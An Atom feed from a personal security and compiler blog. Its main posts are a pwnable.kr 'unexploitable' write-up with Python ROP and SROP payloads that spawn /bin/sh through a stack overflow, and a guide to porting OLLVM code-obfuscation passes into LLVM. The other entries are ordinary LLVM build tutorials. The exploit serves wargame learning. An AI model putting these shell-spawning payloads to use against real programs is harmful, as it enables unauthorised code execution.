<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fancy&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://fancy-blogs.com/"/>
  <updated>2019-09-02T08:31:41.416Z</updated>
  <id>http://fancy-blogs.com/</id>
  
  <author>
    <name>fancy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SROP</title>
    <link href="http://fancy-blogs.com/2019/09/02/SROP/"/>
    <id>http://fancy-blogs.com/2019/09/02/SROP/</id>
    <published>2019-09-02T08:29:15.000Z</published>
    <updated>2019-09-02T08:31:41.416Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="pwnable-kr-unexploitable-SROP"><a href="#pwnable-kr-unexploitable-SROP" class="headerlink" title="pwnable.kr-unexploitable(SROP)"></a>pwnable.kr-unexploitable(SROP)</h1><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><p>一个栈溢出漏洞。</p><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>利用syscall(59)代替执行execve<br>得到rax=59（利用read返回值）</p><ol><li>bss中写入跳入bss的rop</li><li>构造利用read读取59字节的rop</li><li>执行syscall</li></ol><p>填充main栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bss_base = <span class="number">0x0000000000601028</span> + <span class="number">0x200</span></span><br><span class="line">bash_addr = <span class="number">0x0000000000601028</span> + <span class="number">0x400</span></span><br><span class="line">syscall_addr = <span class="number">0x00400560</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x00400512</span></span><br><span class="line">leave_ret = <span class="number">0x00400576</span></span><br><span class="line">part1 = <span class="number">0x004005e6</span></span><br><span class="line">part2 = <span class="number">0x004005d0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span><span class="params">(call_addr, arg1, arg2, arg3)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP first ret to part1</span></span><br><span class="line">    payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></span><br><span class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></span><br><span class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></span><br><span class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></span><br><span class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></span><br><span class="line">    payload += p64(part2)       <span class="comment"># ret to part2 prepare to execute the call</span></span><br><span class="line">    payload += <span class="string">"C"</span> * <span class="number">0x38</span>       <span class="comment"># for add rsp,0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload1  = <span class="string">"A"</span> * <span class="number">0x10</span>              <span class="comment">#填充main的栈</span></span><br><span class="line">payload1 += p64(bss_base)           <span class="comment">#bss_base-&gt;rbp</span></span><br><span class="line">payload1 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bss_base, <span class="number">0x200</span>)<span class="comment">#write rop to bss</span></span><br><span class="line">payload1 += p64(pop_rbp_ret)    <span class="comment">#ret to pop instruction make the rbp point to bss[+I1]</span></span><br><span class="line">payload1 += p64(bss_base)       <span class="comment">#pop value[-I1]</span></span><br><span class="line">payload1 += p64(leave_ret)      <span class="comment">#ret to leave instruction[+I2]</span></span><br><span class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)   <span class="comment">#the value pop to rbp[-I2]</span></span><br><span class="line">payload2 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bash_addr, <span class="number">0x200</span>)<span class="comment">#write payload to bash_addr and make the value of rax is the return-value of read[-I2]</span></span><br><span class="line">payload2 += call_function(bash_addr+<span class="number">0x10</span>, bash_addr, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload3 = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x10</span>, <span class="string">"B"</span>) </span><br><span class="line">payload3 += p64(syscall_addr)   <span class="comment">#the address of instruction to call</span></span><br><span class="line">payload3 = payload3.ljust(<span class="number">59</span>, <span class="string">"D"</span>)</span><br></pre></td></tr></table></figure><p>rop流程：<br>第一次read：将read调用rop和跳转到bss段执行所需的rop写入栈<br>第二次read：将调用read的rop和调用syscall的rop写入bss<br>第三次read：将”/bin/sh”写入bash_addr，将syscall地址设置为返回地址，并将payload填充至59字节，使得read调用返回值为59触发execve。</p><h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）</p><p><img src="/2019/09/02/SROP/15673894987140.jpg" alt=""></p><p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：</p><p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>：</p><p><img src="/2019/09/02/SROP/15673912142638.jpg" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>之前通过ROP的方式实现利用，但是需要构造的gadgets很多，流程也十分繁琐，而利用SROP利用流程就变得简洁许多。<br>同样利用read将调用read的rop和跳转到bss段执行所需的rop写入栈，利用第二次调用read将sig_frame和”/bin/sh”写入bss，并且构造第三次调用read的rop，第三次调用read是为了将rax设置为15，使syscall触发__NR_rt_sigreturn，sigreturn被设置为syscall，rdi为”/bin/sh”地址，rax为59，成功执行execve(“/bin/sh”)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_function</span><span class="params">(call_addr, arg1, arg2, arg3)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += p64(part1)       <span class="comment"># =&gt; RSP</span></span><br><span class="line">    payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># =&gt; RBX</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># =&gt; RBP</span></span><br><span class="line">    payload += p64(call_addr)   <span class="comment"># =&gt; R12 =&gt; RIP</span></span><br><span class="line">    payload += p64(arg1)        <span class="comment"># =&gt; R13 =&gt; RDI</span></span><br><span class="line">    payload += p64(arg2)        <span class="comment"># =&gt; R14 =&gt; RSI</span></span><br><span class="line">    payload += p64(arg3)        <span class="comment"># =&gt; R16 =&gt; RDX</span></span><br><span class="line">    payload += p64(part2)</span><br><span class="line">    payload += <span class="string">"C"</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">sig_frame = SigreturnFrame()              <span class="comment">#设置SROP Frame</span></span><br><span class="line">sig_frame.rax = <span class="number">59</span></span><br><span class="line">sig_frame.rdi = bss_base+<span class="number">0x200</span></span><br><span class="line">sig_frame.rsi = <span class="number">0</span></span><br><span class="line">sig_frame.rdx = <span class="number">0</span></span><br><span class="line">sig_frame.rip = syscall_addr</span><br><span class="line">payload1  = <span class="string">"A"</span> * <span class="number">0x10</span></span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, bss_base, <span class="number">0x300</span>)</span><br><span class="line">payload1 += p64(pop_rbp_ret)</span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += p64(leave_ret)</span><br><span class="line">payload2  = p64(bss_base+<span class="number">0x8</span>)</span><br><span class="line">payload2 += call_function(elf.got[<span class="string">"read"</span>], <span class="number">0</span>, sig_stage, <span class="number">0x100</span>)</span><br><span class="line">payload2 += sig_frame</span><br><span class="line">payload2  = payload2.ljust(<span class="number">0x200</span>, <span class="string">"\x00"</span>)</span><br><span class="line">payload2 += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload3  = <span class="string">"D"</span> * <span class="number">0xf</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;pwnable-kr-unexploitable-SROP&quot;&gt;&lt;a href=&quot;#pwnable-kr-unexploitable-SROP&quot; class=&quot;hea
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>移植OLLVM混淆pass</title>
    <link href="http://fancy-blogs.com/2019/03/22/rebuildpass/"/>
    <id>http://fancy-blogs.com/2019/03/22/rebuildpass/</id>
    <published>2019-03-21T16:00:00.000Z</published>
    <updated>2019-03-24T08:57:39.347Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="移植OLLVM混淆pass"><a href="#移植OLLVM混淆pass" class="headerlink" title="移植OLLVM混淆pass"></a>移植OLLVM混淆pass</h1><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>仅仅是学习混淆pass的编写，改动不是很大。将OLLVM的pass放进新版本（7.0.0 release）的LLVM源码下进行编译。<br>OLLVM的pass目录：<code>OLLVM/lib/Transforms/Obfuscation</code></p><p>控制流平坦化：Flattening.cpp<br>虚假控制流：BogusControlFlow.cpp SplitBasicBlocks.cpp<br>指令替换：Substitution.cpp</p><p>对应头文件目录：<code>OLLVM/include/llvm/Transforms/Obfuscation</code></p><p>这里以分割基本块的pass为例，将<br>SplitBasicBlocks.cpp SplitBasicBlocks.h<br>Utils.cpp Utils.h<br>CryptoUtils.h(include/llvm/)<br>复制到对应目录。</p><p>修改对应目录下的LLVMBuild.txt，subdirectories添加模块目录名称。修改对应目录下（Obfuscation目录下和Transforms目录下）的CMakeLists.txt，add_llvm_library添加模块名称和参与编译文件，add_dependencies添加模块名称。此时进行编译就可以看到build/lib目录下已经有libLLVMObfus.a（我把OLLVM里的Obfuscation改成了Obfus）。<br>但是此时运行opt，发现无<code>-split</code>参数。</p><p>所以我们还需要修改IPO（Transforms/IPO），加入PassManager之后可以直接通过clang的参数使用pass了<br>PassManagerBuilder.cpp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">45</span>      <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"llvm/Transforms/Obfus/Split.h"</span></span></span><br><span class="line">+<span class="number">158</span>     <span class="keyword">static</span> cl::opt&lt;<span class="keyword">bool</span>&gt; Split(<span class="string">"split"</span>, cl::init(<span class="literal">false</span>),cl::desc(<span class="string">"Enable basic block splitting"</span>));</span><br><span class="line">+<span class="number">433</span>     MPM.add(createSplitBasicBlock(Split));</span><br></pre></td></tr></table></figure><p>IPO的LLVMBuild.txt：<br><code>+required_libraries=Obfus</code></p><p>ok，此时编译完成后，opt参数列表里就有了<code>-split</code>。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>split PASS的实现：</p><ul><li>保存Function的所有Block；</li><li>逐个处理Block，对非单一指令BB和不包含PHI指令的BB进行分割；</li><li>生成乱序表；</li><li>乱序处理Block中的指令；</li><li><p>具体处理单个指令的方法：<br><code>*BasicBlock-&gt;splitBasicBlock(BasicBlock::iterator,*BasicBlock-&gt;getName()+&quot;.splist&quot;)</code><br>位于<code>OLLVM/lib/IR/BasicBlock.cpp</code></p><blockquote><p>在指定的指令处将一个基本块一分为二。注意所有在指定指令前的指令会作为原始基本块的一部分,一个无条件分支会被添加到新的BB，余下的指令会被移到新的BB，包括旧BB的终止符。这会使迭代器无效。<br>注意这只针对一下格式合格的BB（有头有尾），并且指定的指令不允许是指令列表的最后一个（会导致生成一个退化的BB，而且内部带终止符）。</p></blockquote></li><li><p>新建一个BB，将指定指令移到新的BB，为新BB添加分支指令；</p></li><li>遍历新block的后继block，更新所有PHI节点信息，将原来从旧block出来的分支路径改为从新block出来。</li></ul><p>判断PHI节点：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (BasicBlock::iterator II = Successor-&gt;begin();</span><br><span class="line">         (PN = dyn_cast&lt;PHINode&gt;(II)); ++II) &#123;</span><br><span class="line">      <span class="keyword">int</span> IDX = PN-&gt;getBasicBlockIndex(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">while</span> (IDX != <span class="number">-1</span>) &#123;</span><br><span class="line">        PN-&gt;setIncomingBlock((<span class="keyword">unsigned</span>)IDX, New);</span><br><span class="line">        IDX = PN-&gt;getBasicBlockIndex(<span class="keyword">this</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里添加几条打印信息代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#++ <span class="number">88</span> </span><br><span class="line">errs()&lt;&lt;<span class="string">"This BB size: "</span>&lt;&lt;curr-&gt;size()&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">#++ <span class="number">114</span> </span><br><span class="line">errs()&lt;&lt;<span class="string">"To split instruction: "</span>&lt;&lt;*it&lt;&lt;<span class="string">"\n"</span>;   </span><br><span class="line">#++ <span class="number">125</span> </span><br><span class="line">errs()&lt;&lt;<span class="string">"After split: \n"</span>;</span><br><span class="line"><span class="keyword">for</span>(BasicBlock::iterator sptit = toSplit-&gt;begin();sptit!=toSplit-&gt;end();++sptit)&#123;</span><br><span class="line">    errs()&lt;&lt;<span class="string">"[+] "</span>&lt;&lt;*sptit&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">errs()&lt;&lt;<span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>打印出对BB的分割点。</p><p>对比pass效果<br><code>./clang -save-temps -S -mllvm -split test.c -o test.s</code><br>拿到的是pass处理的汇编文件，和中间文件。<br>对test.bc-&gt;test.ll-&gt;test.s(得到未经过pass处理的汇编文件)，可自行对比（处理的BB会被添上“.split”）。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;移植OLLVM混淆pass&quot;&gt;&lt;a href=&quot;#移植OLLVM混淆pass&quot; class=&quot;headerlink&quot; title=&quot;移植OLLVM混淆pass&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在源代码目录外编译clang例子</title>
    <link href="http://fancy-blogs.com/2019/02/28/buildexample/"/>
    <id>http://fancy-blogs.com/2019/02/28/buildexample/</id>
    <published>2019-02-28T08:00:00.000Z</published>
    <updated>2019-02-28T10:35:09.254Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="在源代码目录外编译clang例子"><a href="#在源代码目录外编译clang例子" class="headerlink" title="在源代码目录外编译clang例子"></a>在源代码目录外编译clang例子</h1><p>之前bitcode读写的例子编译一直报错，CMakeLists.txt改的面目全非，搜索过程中找到一个llvm工具编译的通用模版。</p><h2 id="如何为独立的clang-tool编写CMakeLists-txt"><a href="#如何为独立的clang-tool编写CMakeLists-txt" class="headerlink" title="如何为独立的clang tool编写CMakeLists.txt"></a>如何为独立的clang tool编写CMakeLists.txt</h2><p><code>cmake -DCMAKE_EXPORT_COMPILE_COMMANDS=ON -DCMAKE_PREFIX_PATH=/Users/fancy/Documents/LLVM/build/</code></p><p>DCMAKE_PREFIX_PATH指定你的llvm编译生成目录</p><p>CMakeLists.txt:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.4.3)</span><br><span class="line"></span><br><span class="line">set(CMAKE_CONFIGURATION_TYPES &quot;Debug;Release&quot; CACHE STRING &quot;Configs&quot; FORCE)</span><br><span class="line">set(CMAKE_SUPPRESS_REGENERATION TRUE)</span><br><span class="line"></span><br><span class="line">############################################################</span><br><span class="line">#   setting Project informations</span><br><span class="line">############################################################</span><br><span class="line"></span><br><span class="line">set(PROJECT_NAME &quot;llvm_bc_parsing_example&quot;)</span><br><span class="line"></span><br><span class="line">set(LIBRARY_LIST )</span><br><span class="line">set(LIBRARY_LIST $&#123;LIBRARY_LIST&#125;   )</span><br><span class="line">set(COMPONENT_LIST mcparser bitwriter bitreader support mc option )</span><br><span class="line"></span><br><span class="line">############################################################</span><br><span class="line">#   generate makefiles</span><br><span class="line">############################################################</span><br><span class="line"></span><br><span class="line">project($&#123;PROJECT_NAME&#125;)</span><br><span class="line"></span><br><span class="line">find_package(LLVM REQUIRED CONFIG)</span><br><span class="line">message(STATUS &quot;Found LLVM $&#123;LLVM_PACKAGE_VERSION&#125;&quot;)</span><br><span class="line">message(STATUS &quot;Using LLVMConfig.cmake in: $&#123;LLVM_DIR&#125;&quot;)</span><br><span class="line"></span><br><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br><span class="line">if(LLVM_BUILD_MAIN_SRC_DIR)</span><br><span class="line">  include_directories($&#123;LLVM_BUILD_MAIN_SRC_DIR&#125;/tools/clang/include)</span><br><span class="line">  include_directories($&#123;LLVM_BUILD_BINARY_DIR&#125;/tools/clang/include)</span><br><span class="line">endif()</span><br><span class="line">link_directories($&#123;LLVM_LIBRARY_DIRS&#125;)</span><br><span class="line">add_definitions($&#123;LLVM_DEFINITIONS&#125;)</span><br><span class="line"></span><br><span class="line">add_executable($&#123;PROJECT_NAME&#125; main.c)</span><br><span class="line"></span><br><span class="line">if (&quot;$&#123;CMAKE_CXX_COMPILER_ID&#125;&quot; STREQUAL &quot;MSVC&quot;)</span><br><span class="line">  foreach(link_lib IN LISTS LIBRARY_LIST)</span><br><span class="line">    target_link_libraries($&#123;PROJECT_NAME&#125; optimized $&#123;link_lib&#125;)</span><br><span class="line">    target_link_libraries($&#123;PROJECT_NAME&#125; debug     $&#123;link_lib&#125;d)</span><br><span class="line">  endforeach()</span><br><span class="line">else()</span><br><span class="line">  target_link_libraries($&#123;PROJECT_NAME&#125; $&#123;LIBRARY_LIST&#125;)</span><br><span class="line">  set(CMAKE_CXX_FLAGS &quot;-std=c99 -Wno-unused-parameter -fno-strict-aliasing -Weverything -Wno-switch-enum&quot;)</span><br><span class="line">  #set(CMAKE_EXE_LINKER_FLAGS &quot;-static -static-libgcc -static-libstdc++&quot;)</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line">llvm_map_components_to_libnames(llvm_libs $&#123;COMPONENT_LIST&#125;)</span><br><span class="line">target_link_libraries($&#123;PROJECT_NAME&#125; $&#123;llvm_libs&#125;)</span><br><span class="line"></span><br><span class="line">message(STATUS &quot;User selected librarys = $&#123;LIBRARY_LIST&#125;&quot;)</span><br><span class="line">message(STATUS &quot;User selected components = $&#123;COMPONENT_LIST&#125;&quot;)</span><br><span class="line">message(STATUS &quot;    = $&#123;llvm_libs&#125;&quot;)</span><br></pre></td></tr></table></figure><p>COMPONENT_LIST添加你的代码需要的库名称（模块名就行，不需要完整的文件名）</p><p><a href="https://heejune.me/2016/08/17/build-your-own-clang-example-outside-of-the-llvm-source-tree/" target="_blank" rel="noopener">https://heejune.me/2016/08/17/build-your-own-clang-example-outside-of-the-llvm-source-tree/</a></p><p><a href="https://qiita.com/Chironian/items/8770c8ab833086fb51a9#328cmakeliststxt%E3%81%BE%E3%81%A8%E3%82%81" target="_blank" rel="noopener">https://qiita.com/Chironian/items/8770c8ab833086fb51a9#328cmakeliststxt%E3%81%BE%E3%81%A8%E3%82%81</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;在源代码目录外编译clang例子&quot;&gt;&lt;a href=&quot;#在源代码目录外编译clang例子&quot; class=&quot;headerlink&quot; title=&quot;在源代码目录外编译c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何读写LLVM bitcode</title>
    <link href="http://fancy-blogs.com/2019/02/27/RWBitcode/"/>
    <id>http://fancy-blogs.com/2019/02/27/RWBitcode/</id>
    <published>2019-02-27T08:00:00.000Z</published>
    <updated>2019-03-22T02:19:37.390Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="如何读写LLVM-bitcode"><a href="#如何读写LLVM-bitcode" class="headerlink" title="如何读写LLVM bitcode"></a>如何读写LLVM bitcode</h1><p>翻译转载</p><p>我已经阅读了社交媒体上的多篇帖子，现在抱怨LLVM有多可怕。<br>存储库太大以至于无法获得有用的信息，每天经常有数百次提交，邮件列表几乎不可能跟踪，现在可执行的可执行文件高达40Mb …</p><p>将那些花絮放在一边 - 一旦你掌握了这头巨兽，LLVM就非常容易使用了。<br>为了帮助人们使用LLVM，我想我会把你会用LLVM做的琐碎的操作示例放在一起 - 解析一个LLVM的中间表示文件（称为bitcode，文件扩展名.bc），然后再写回来。</p><p>首先，我们浏览一些高级LLVM术语：</p><ul><li>对于用户代码来说LLVM的主要抽象对象是Module。它是一个包含所有函数，全局变量，以及你或用户编写的代码指令的类。</li><li>Bitcode文件实际上是LLVM Module的序列化，以便可以在一个不同的程序中重组。</li><li>LLVM实验MemoryBuffer 对象来处理来自文件、标准输入或数组的数据</li></ul><p>以我的例子，我将使用LLVM C API - 一个比LLVM内核C++头文件更稳定的抽象。如果你希望使用多个版本的LLVM代码，那么C API非常有用，他比LLVM C++头文件更稳定。（另外，我将LLVM广泛用于我的工作，几乎每周都会有一些LLVM C++头文件被更改以破坏我们的代码。而C API从来不会。）</p><p>这里，我将假设你已经启动了LLVM，构建完并安装了它。像这样执行一下简单的步骤：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://git.llvm.org/git/llvm.git &lt;llvm dir&gt;</span><br><span class="line">cd &lt;llvm dir&gt;</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=RELEASE -DCMAKE_INSTALL_PREFIX=install ..</span><br><span class="line">cmake --build . --target install</span><br></pre></td></tr></table></figure><p>以上步骤完成后，你将会得到一个安装在/build/install下的LLVM</p><p>至此，对于一些小可执行文件我使用了CMake。CMake是目前为止结合LLVM的最简单的方法，LLVM也使用它作为自己的构建系统。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">project</span>(llvm_bc_parsing_example)</span><br><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.4</span>.<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># option to allow a user to specify where an LLVM install is on the system</span></span><br><span class="line"><span class="keyword">set</span>(LLVM_INSTALL_DIR <span class="string">""</span> CACHE <span class="keyword">STRING</span> <span class="string">"An LLVM install directory."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">"$&#123;LLVM_INSTALL_DIR&#125;"</span> <span class="keyword">STREQUAL</span> <span class="string">""</span>)</span><br><span class="line">  <span class="keyword">message</span>(FATAL_ERROR <span class="string">"LLVM_INSTALL_DIR not set! Set it to the location of an LLVM install."</span>)</span><br><span class="line"><span class="keyword">endif</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># fixup paths to only use the Linux convention</span></span><br><span class="line"><span class="keyword">string</span>(REPLACE <span class="string">"\\"</span> <span class="string">"/"</span> LLVM_INSTALL_DIR <span class="variable">$&#123;LLVM_INSTALL_DIR&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tell CMake where LLVM's module is</span></span><br><span class="line">list(APPEND CMAKE_MODULE_PATH <span class="variable">$&#123;LLVM_INSTALL_DIR&#125;</span>/lib/cmake/llvm)</span><br><span class="line"></span><br><span class="line"><span class="comment"># include LLVM</span></span><br><span class="line"><span class="keyword">include</span>(LLVMConfig)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span>(llvm_bc_parsing_example main.c)</span><br><span class="line"></span><br><span class="line">target_include_directories(llvm_bc_parsing_example PUBLIC <span class="variable">$&#123;LLVM_INCLUDE_DIRS&#125;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(llvm_bc_parsing_example PUBLIC LLVMBitReader LLVMBitWriter)</span><br></pre></td></tr></table></figure><p>所以现在我们已经完成了CMake的设置，我们可以使用现有的LLVM安装，现在我们可以开始使用我们的实际C代码了！<br>因此，要使用LLVM C API，主要需要一个头文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm-c/Core.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们需要两个额外的头文件来执行bitcode的读写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm-c/BitReader.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 